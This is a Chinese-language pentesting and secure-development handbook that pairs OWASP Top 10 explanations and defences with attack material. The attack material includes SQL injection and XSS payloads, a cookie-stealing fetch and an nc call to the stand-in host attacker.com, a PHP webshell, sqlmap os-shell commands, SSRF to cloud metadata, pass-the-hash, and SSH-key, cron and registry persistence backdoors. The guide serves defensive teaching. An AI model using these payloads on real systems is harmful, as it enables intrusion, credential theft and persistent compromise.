# 安全开发与渗透测试实战

## 第一章：Web安全基础

### 1.1 OWASP Top 10 详解

#### A01:2021 - 访问控制失效（Broken Access Control）

**垂直越权**
- **定义**：低权限用户访问高权限资源
- **场景**：
  - 普通用户访问管理员页面
  - 修改URL参数访问他人账户
  - 直接调用未授权API接口

- **测试方法**：
  ```bash
  # 修改用户ID访问他人数据
  GET /api/users/1234/profile  # 修改为5678
  GET /admin/delete_user?id=1234  # 未授权访问
  ```

- **防御措施**：
  1. 基于角色的访问控制（RBAC）
  2. 最小权限原则
  3. 服务器端验证所有请求
  4. 敏感操作审计日志

**水平越权**
- **定义**：同权限级别用户访问他人资源
- **场景**：
  - 修改URL参数访问他人订单
  - API参数遍历
  - 共享资源访问控制失效

- **测试案例**：
  ```python
  # 易受攻击的代码示例
  @app.route('/api/order/<order_id>')
  def get_order(order_id):
      # 直接返回任意order_id的订单
      return Order.query.get(order_id)
  
  # 修复后
  @app.route('/api/order/<order_id>')
  def get_order(order_id):
      order = Order.query.get(order_id)
      if order.user_id != current_user.id:
          abort(403)
      return order
  ```

#### A02:2021 - 加密机制失效（Cryptographic Failures）

**敏感数据泄露**
- **常见泄露点**：
  - URL中的敏感参数（令牌、密码）
  - HTTP GET请求参数
  - 错误消息泄露敏感信息
  - 缓存中的敏感数据

- **测试方法**：
  ```bash
  # 检查URL敏感信息
  curl -I https://example.com/api/user/123?token=secret_token
  
  # 检查响应头泄露
  curl -I https://example.com
  # Server: Apache/2.4.41
  # X-Powered-By: PHP/7.4.3
  
  # 检查敏感文件访问
  curl https://example.com/.git/config
  curl https://example.com/.env
  ```

- **加密最佳实践**：
  1. 使用现代加密算法（AES-256-GCM, ChaCha20-Poly1305）
  2. TLS 1.3（避免TLS 1.0/1.1）
  3. 敏感数据使用HTTPS传输
  4. 密码使用bcrypt/Argon2存储
  5. 使用HMAC保护数据完整性

#### A03:2021 - 注入攻击（Injection）

**SQL注入**
- **盲注**：
  ```sql
  -- 基于布尔的盲注
  ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
  
  -- 基于时间的盲注
  ' AND IF(1=1, SLEEP(5), 0) --
  ```

- **UNION注入**：
  ```sql
  ' UNION SELECT username, password, email, NULL FROM users --
  
  -- 枚举数据库信息
  ' UNION SELECT version(), user(), database(), 4 --
  ```

- **自动化工具**：
  ```bash
  # SQLMap使用
  sqlmap -u "https://example.com?id=1" --dbs
  sqlmap -u "https://example.com?id=1" -D users --tables
  sqlmap -u "https://example.com?id=1" -D users -T admin --columns
  ```

- **防御措施**：
  ```python
  # 参数化查询（推荐）
  cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
  
  # ORM查询（安全）
  User.query.filter_by(id=user_id).first()
  
  # 白名单验证
  if user_id not in ALLOWED_IDS:
      abort(403)
  ```

**命令注入**
- **危险函数**：
  - PHP: `exec()`, `system()`, `shell_exec()`
  - Python: `os.system()`, `subprocess` with shell=True
  - Java: `Runtime.exec()`

- **漏洞利用**：
  ```bash
  # ping命令注入
  ping; cat /etc/passwd
  ping && wget backdoor
  ping | nc attacker.com 4444
  ```

- **安全编程**：
  ```python
  # 避免shell=True
  subprocess.run(['ping', '-c', '3', host])
  
  # 输入验证
  import re
  if not re.match(r'^[a-zA-Z0-9.-]+$', host):
      abort(400)
  ```

**XSS攻击**
- **反射型XSS**：
  ```javascript
  // URL: https://example.com/search?q=<script>alert('XSS')</script>
  document.innerHTML = "Search results for: " + urlParams.get('q');
  ```

- **存储型XSS**：
  ```javascript
  // 评论中注入
  <img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>
  ```

- **DOM型XSS**：
  ```javascript
  // 不安全的innerHTML使用
  document.getElementById('output').innerHTML = location.hash.substring(1);
  ```

- **XSS防护**：
  ```javascript
  // Content Security Policy
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz'
  
  // HTML转义
  function escapeHTML(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#039;');
  }
  ```

#### A04:2021 - 不安全设计

**业务逻辑漏洞**
- **验证码绕过**：
  1. 删除验证码参数
  2. 使用旧会话
  3. 验证码复用

- **支付逻辑漏洞**：
  ```javascript
  // 修改支付金额
  POST /api/pay
  { amount: 0.01, product_id: 123 }
  
  // 负数充值的场景
  POST /api/transfer
  { from: user1, to: user2, amount: -1000 }
  ```

- **权限绕过**：
  ```javascript
  // 步骤绕过
  POST /api/order/confirm
  { step: 3 }  // 跳过step=2的验证
  
  // 竞态条件（Race Condition）
  // 并发提现漏洞
  async function withdraw(amount) {
      const balance = await getBalance();
      if (balance >= amount) {
          await updateBalance(-amount);  // 不是原子操作
          await transferToUser(amount);
      }
  }
  ```

### 1.2 认证与会话安全

**密码策略**
```
最佳实践：
- 最小长度：12字符
- 支持Unicode字符
- 不使用复杂规则（易被预测）
- 使用密码管理器
- 定期检查泄露（Have I Been Pwned）
```

**多因素认证（MFA）**
```python
# TOTP实现示例
import pyotp

# 生成密钥
totp = pyotp.TOTP('JBSWY3DPEHPK3PXP')
secret_key = totp.secret  # 存储在数据库

# 验证代码
def verify_totp(user_secret, user_code):
    totp = pyotp.TOTP(user_secret)
    return totp.verify(user_code)

# 备用码存储
backup_codes = hashlib.sha256(random_bytes(16)).hexdigest()
```

**会话管理**
```python
# 安全Cookie配置
response.set_cookie(
    'session_id',
    session_id,
    secure=True,      # HTTPS传输
    httponly=True,   # 禁止JS访问
    samesite='Strict',  # CSRF防护
    max_age=3600     # 过期时间
)

# JWT安全使用
token = jwt.encode(
    {'user_id': user.id, 'exp': time.time() + 3600},
    SECRET_KEY,
    algorithm='HS256'
)

# JWT验证
def verify_jwt(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthenticationError('Token expired')
```

---

## 第二章：渗透测试方法论

### 2.1 信息收集

#### 被动信息收集

**搜索引擎利用**
```bash
# Google Hacking
site:example.com filetype:xls
site:example.com inurl:admin
site:example.com intitle:"Dashboard"
site:example.com "password"
site:example.com "username"

# GitHub搜索
site:github.com "example.com" password
site:github.com "api_key" "example.com"
```

**WHOIS查询**
```bash
whois example.com
# 获取注册信息、联系方式、DNS服务器
```

**DNS枚举**
```bash
# 子域名发现
sublist3r -d example.com -o subdomains.txt

# DNS区域传输
dig axfr @ns1.example.com example.com

# DNS记录查询
dig +short mx example.com
dig +txt example.com
```

**技术栈识别**
```bash
# Wappalyzer
wget https://example.com
grep -i "X-Powered-By\|Server\|X-Generator"

# WhatWeb
whatweb example.com

# BuiltWith
curl https://builtwith.com/example.com
```

#### 主动信息收集

**端口扫描**
```bash
# Nmap基本扫描
nmap -sS -sV -O target.com
nmap -p- target.com
nmap --script=vuln target.com

# 端口服务识别
nmap -sV --script=banner target.com

# 防火墙检测
nmap -sA target.com
```

**Web目录扫描**
```bash
# Dirbuster/Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/

# 参数发现
wfuzz -c -z file,/usr/share/wordlists/params.txt https://target.com?FUZZ=value
```

### 2.2 漏洞利用

#### Web漏洞利用框架

**Metasploit**
```bash
# 搜索漏洞模块
search type:exploit target.com

# 使用模块
use exploit/multi/http/struts_rce
set RHOSTS target.com
set TARGETURI /api/endpoint
run

# 获取Meterpreter
set payload linux/x64/meterpreter/reverse_tcp
```

**Burp Suite**
- Proxy流量拦截
- Repeater请求重放
- Intruder自动化攻击
- Scanner漏洞扫描
- Decoder编码解码

**SQLMap**
```bash
# 基本SQL注入
sqlmap -u "https://target.com?id=1" --dbs

# 执行OS命令
sqlmap -u "https://target.com?id=1" --os-shell

# 文件读写
sqlmap -u "https://target.com?id=1" --file-read=/etc/passwd
sqlmap -u "https://target.com?id=1" --file-write=/tmp/shell.php
```

#### 常见漏洞利用技巧

**文件上传漏洞**
```php
<?php
// shell.php - WebShell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

// 图片马制作
echo 'GIF89a' > shell.gif
cat shell.php >> shell.gif
```

**文件包含漏洞**
```php
// 本地文件包含
?page=../../etc/passwd

// 远程文件包含（RFI）
?page=http://attacker.com/shell.txt

// PHP伪协议
?page=php://filter/convert.base64-encode/resource=config.php
```

**SSRF漏洞**
```python
# 服务端请求伪造
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    # 无限制的URL访问
    return requests.get(url).content

# 利用场景
# 访问内部服务
?url=http://169.254.169.254/latest/meta-data/
# Redis写入
?url=gopher://127.0.0.1:6379/_SET%20key%20value
```

### 2.3 后渗透攻击

**权限提升**
```bash
# Linux提权
# 查找SUID文件
find / -perm -u=s -type f 2>/dev/null

# 检查sudo权限
sudo -l

# 内核漏洞利用
uname -a
searchsploit kernel

# Windows提权
# 检查服务权限
icacls "C:\Program Files\MyService"

# DLL劫持
# 检查路径劫持
whoami /priv
```

**横向移动**
```bash
# Pass the Hash
pth-winexe -U domain/user%hash://ntlm:target.com cmd

# Pass the Ticket
# Kerberos票据传递

# 远程服务利用
psexec.py domain/user@target.com
wmiexec.py domain/user@target.com
```

**持久化**
```bash
# Linux后门
# SSH密钥后门
echo "ssh-rsa AAAAB... root@kali" >> ~/.ssh/authorized_keys

# Cron后门
echo "*/1 * * * * /tmp/backdoor" >> /var/spool/cron/crontabs/root

# Windows后门
# 注册表启动项
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\backdoor.exe"

# 服务后门
sc create Backdoor binPath= "C:\Windows\backdoor.exe" start= auto
```

---

## 第三章：安全开发实践

### 3.1 安全编码规范

#### 输入验证

**白名单验证**
```python
# 验证邮箱格式
import re

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValidationError('Invalid email format')
    return email

# 验证文件路径
import os

def safe_read_file(requested_path):
    base_path = '/var/www/files'
    full_path = os.path.abspath(os.path.join(base_path, requested_path))
    
    if not full_path.startswith(base_path):
        raise SecurityError('Path traversal detected')
    
    return open(full_path).read()
```

**输出编码**
```javascript
// HTML编码
function htmlEncode(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// JavaScript编码
function jsEncode(str) {
    return str.replace(/\\/g, '\\\\')
              .replace(/"/g, '\\"')
              .replace(/'/g, "\\'")
              .replace(/\n/g, '\\n');
}

// URL编码
function urlEncode(str) {
    return encodeURIComponent(str)
            .replace(/!/g, '%21')
            .replace(/'/g, '%27')
            .replace(/\(/g, '%28')
            .replace(/\)/g, '%29');
}
```

#### 认证授权

**OAuth 2.0安全**
```python
# Authorization Code Flow
@app.route('/auth/callback')
def callback():
    code = request.args.get('code')
    
    # 验证state防止CSRF
    if code != session.get('oauth_state'):
        abort(403)
    
    # 交换token
    token_response = requests.post(
        'https://auth.example.com/oauth/token',
        data={
            'grant_type': 'authorization_code',
            'code': code,
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'redirect_uri': REDIRECT_URI
        }
    )
    
    # 验证ID Token
    id_token = token_response.json().get('id_token')
    claims = verify_id_token(id_token, CLIENT_ID)
    
    return create_session(claims)
```

**会话安全**
```python
# 会话管理最佳实践
SESSION_CONFIG = {
    'session_cookie_secure': True,      # HTTPS Only
    'session_cookie_httponly': True,    # No JS Access
    'session_cookie_samesite': 'Strict', # CSRF Protection
    'session_timeout': 3600,            # 1小时过期
    'session_renew': True,              # 活跃时刷新
    'absolute_timeout': 86400,         # 24小时强制过期
}

# 并发会话控制
MAX_SESSIONS_PER_USER = 3
def manage_session_limit(user_id):
    sessions = Session.query.filter_by(user_id=user_id).all()
    if len(sessions) >= MAX_SESSIONS_PER_USER:
        oldest_session = sessions[0]
        oldest_session.delete()
```

### 3.2 安全测试工具

#### SAST（静态应用安全测试）

**SonarQube规则示例**
```
High: SQL Injection
- 检测模式: string.format with SQL
- 修复建议: 使用参数化查询

High: Command Injection
- 检测模式: Runtime.exec with user input
- 修复建议: 使用安全的API

Medium: Weak Cryptography
- 检测模式: MD5/SHA1 for passwords
- 修复建议: 使用bcrypt/Argon2
```

**Bandit（Python SAST）**
```bash
# 安装和运行
pip install bandit
bandit -r my_project/

# 忽略特定告警
# bandit: ignore=B101
```

#### DAST（动态应用安全测试）

**OWASP ZAP**
```bash
# 启动ZAP代理
zap.sh -daemon -port 8080

# 爬虫扫描
zap-cli --zap-url http://localhost:8080 spider https://target.com

# 主动扫描
zap-cli --zap-url http://localhost:8080 scan https://target.com

# 生成报告
zap-cli --zap-url http://localhost:8080 report -o zap_report.html -f html
```

#### IAST（交互式应用安全测试）

**工具选择**
- Contrast Security
- Synopsys Seeker
- HCL AppScan IAST

**集成到CI/CD**
```yaml
# GitHub Actions示例
jobs:
  security-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run SAST
        run: |
          bandit -r src/ -f json -o bandit_report.json
          
      - name: Run DAST
        run: |
          owasp-zap-cli scan --start-options "-config api.key=${{ secrets.ZAP_API_KEY }}" https://staging.example.com
          
      - name: Upload Results
        uses: actions/upload-artifact@v2
        with:
          name: security-reports
          path: |
            bandit_report.json
            zap_report.html
```

### 3.3 安全监控与响应

**入侵检测系统（IDS）**
```python
# 基于签名的检测
SIGNATURES = {
    'sql_injection': r'(\bUNION\b.*\bSELECT\b|\'.*OR.*1=1)',
    'xss': r'(<script|onerror=|onload=)',
    'path_traversal': r'(\.\./|\.\.\\|%2e%2e)',
    'command_injection': r'(\|;|&|`|\$\()',
}

def detect_attack(request):
    for name, pattern in SIGNATURES.items():
        if re.search(pattern, request.path + request.query_string):
            log_security_event(
                type=name,
                ip=request.remote_addr,
                payload=request.query_string
            )
            return True
    return False
```

**异常检测**
```python
# 登录异常检测
class AnomalyDetector:
    def __init__(self):
        self.login_attempts = defaultdict(list)
        
    def check_login(self, user_id, ip):
        now = time.time()
        # 检查最近1小时的登录尝试
        attempts = [t for t in self.login_attempts[user_id] if now - t < 3600]
        
        if len(attempts) > 5:
            send_security_alert(
                type='brute_force',
                user=user_id,
                ip=ip,
                attempts=len(attempts)
            )
            
        self.login_attempts[user_id].append(now)
        
    def check_geolocation(self, user_id, ip, location):
        # 检测异常地理位置登录
        user_locations = self.get_user_locations(user_id)
        if location not in user_locations:
            send_security_alert(
                type='impossible_travel',
                user=user_id,
                ip=ip,
                location=location
            )
```

---

## 第四章：安全认证与合规

### 4.1 安全认证

#### OWASP安全编码实践

**认证模块设计**
```
安全认证检查清单：
□ 密码存储使用bcrypt/Argon2（加盐）
□ 实施账户锁定机制（最多5次失败尝试）
□ 支持MFA（多因素认证）
□ 使用安全Cookie属性（Secure, HttpOnly, SameSite）
□ JWT使用短期过期（<15分钟）
□ 实施会话并发控制
□ 密码强度检查（12字符+）
□ 支持密码历史（防止重用）
□ 安全的密码重置流程
□ 防止用户名枚举
```

**API安全**
```
API安全检查清单：
□ 所有端点强制认证
□ OAuth 2.0/JWT令牌验证
□ API速率限制
□ 输入验证和参数清理
□ 输出编码和转义
□ 敏感数据加密
□ 安全HTTP头（HSTS, CSP）
□ CORS严格配置
□ 文件上传安全
□ API版本控制
```

### 4.2 安全合规框架

#### OWASP ASVS

**安全验证级别**
```
Level 1 - 自动化检查
  - 基础安全控制验证
  - 适合所有应用

Level 2 - 手动测试
  - 深度安全验证
  - 敏感数据处理应用

Level 3 - 安全专家
  - 最高安全要求
  - 关键基础设施应用
```

**安全测试清单**
```
渗透测试范围：
□ 信息收集
  - 域名枚举
  - 子域名发现
  - 技术栈识别
  
□ 身份认证测试
  - 密码策略
  - 账户锁定
  - 会话管理
  - MFA绕过
  
□ 授权测试
  - 水平越权
  - 垂直越权
  - IDOR漏洞
  
□ 输入验证
  - SQL注入
  - XSS
  - 命令注入
  - 文件包含
  
□ 业务逻辑
  - 流程绕过
  - 条件竞争
  - 支付逻辑
  
□ API安全
  - REST API测试
  - GraphQL测试
  - 速率限制
```

---

## 第五章：安全工具与环境

### 5.1 常用安全工具

**信息收集工具**
```bash
# 被动信息收集
whois, dig, nslookup
theHarvester, Maltego
Shodan, Censys, ZoomEye

# 主动扫描
Nmap, Masscan
Netcat, Hping3
RustScan

# Web信息收集
Wappalyzer, BuiltWith
WhatWeb, BugScraper
```

**漏洞扫描工具**
```bash
# Web漏洞扫描
Nikto, wfuzz
Burp Suite, OWASP ZAP
Arachni, Nuclei

# 数据库扫描
SQLMap, NoSQLMap
JSQL Injection

# 系统扫描
OpenVAS, Nessus
Lynis, Tiger
```

**渗透测试框架**
```bash
# Metasploit Framework
msfconsole
msfvenom

# Cobalt Strike

# Empire/DeathStar
# PowerShell后渗透

# Impacket
psexec.py, smbexec.py
wmiquery.py, dcomexec.py
```

### 5.2 安全开发环境

**DVWA（Damn Vulnerable Web App）**
- PHP/MySQL
- 包含常见漏洞
- 适合学习测试

**VulnHub靶机**
- 多样化漏洞环境
- 实战演练
- 进阶挑战

**HackTheBox**
- 在线渗透平台
- 真实漏洞场景
- 技能评估认证

---

## 参考资源

### 学习平台
- OWASP官网
- PortSwigger Web Security Academy
- HackerOne Hacker101
- PentesterLab
- TryHackMe

### 认证考试
- OSCP（Offensive Security）
- CEH（EC-Council）
- GPEN（SANS）
- CRTP/CRE（Altered Security）

### 书籍推荐
- 《Web应用安全权威指南》
- 《黑客攻防技术宝典：Web实战篇》
- 《Metasploit渗透测试指南》
- 《内网安全攻防：渗透测试实战指南》
- 《Web安全深度剖析》

---

*本知识文件最后更新：2026-02-07*
*涵盖Web安全、渗透测试、安全开发最佳实践*
